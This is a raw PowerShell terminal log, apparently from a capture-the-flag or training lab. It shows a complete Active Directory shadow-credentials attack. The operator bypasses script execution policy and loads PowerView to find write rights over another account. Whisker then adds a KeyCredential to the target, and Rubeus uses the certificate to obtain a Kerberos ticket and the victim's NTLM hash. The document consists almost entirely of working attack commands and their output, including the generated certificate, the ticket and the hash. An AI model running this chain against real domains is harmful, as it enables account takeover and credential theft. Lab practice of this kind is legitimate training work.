```cmd
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\hr> cd .\Desktop\
PS C:\Users\hr\Desktop> powershell.exe -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\hr\Desktop> .\PowerView.ps1
PS C:\Users\hr\Desktop> . .\PowerView.ps1
PS C:\Users\hr\Desktop> Find-InterestingDomainAcl -ResolveGuids | Where-Object { $_.IdentityReferenceName -eq "hr" } | Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights

IdentityReferenceName ObjectDN                                                    ActiveDirectoryRights
--------------------- --------                                                    ---------------------
hr                    CN=vansprinkles,CN=Users,DC=AOC,DC=local ListChildren, ReadProperty, GenericWrite


PS C:\Users\hr\Desktop> .\Whisker.exe add /target:vansprinkles
[*] No path was provided. The certificate will be printed as a Base64 blob
[*] No pass was provided. The certificate will be stored with the password EtuRUs7ej7CSpaDQ
[*] Searching for the target account
[*] Target user found: CN=vansprinkles,CN=Users,DC=AOC,DC=local
[*] Generating certificate
[*] Certificate generaged
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID f3d14083-25ff-40f5-910a-15d6e0506a8b
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] You can now run Rubeus with the following syntax:

Rubeus.exe asktgt /user:vansprinkles /certificate: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 /password:"EtuRUs7ej7CSpaDQ" /domain:AOC.local /dc:southpole.AOC.local /getcredentials /show
PS C:\Users\hr\Desktop> .\Rubeus.exe asktgt /user:vansprinkles /certificate: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 /password:"EtuRUs7ej7CSpaDQ" /domain:AOC.local /dc:southpole.AOC.local /getcredentials /show

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=vansprinkles
[*] Building AS-REQ (w/ PKINIT preauth) for: 'AOC.local\vansprinkles'
[*] Using domain controller: fe80::2501:4f87:c4d4:c3a4%5:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
      T0MubG9jYWw=

  ServiceName              :  krbtgt/AOC.local
  ServiceRealm             :  AOC.LOCAL
  UserName                 :  vansprinkles
  UserRealm                :  AOC.LOCAL
  StartTime                :  12/24/2023 11:36:25 AM
  EndTime                  :  12/24/2023 9:36:25 PM
  RenewTill                :  12/31/2023 11:36:25 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  gzwOHrFnd0oKeYyS7bYZMw==
  ASREP (key)              :  969A100878137D33B6ABB2549AF42982

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 03E805D8A8C5AA435FB48832DAD620E3
```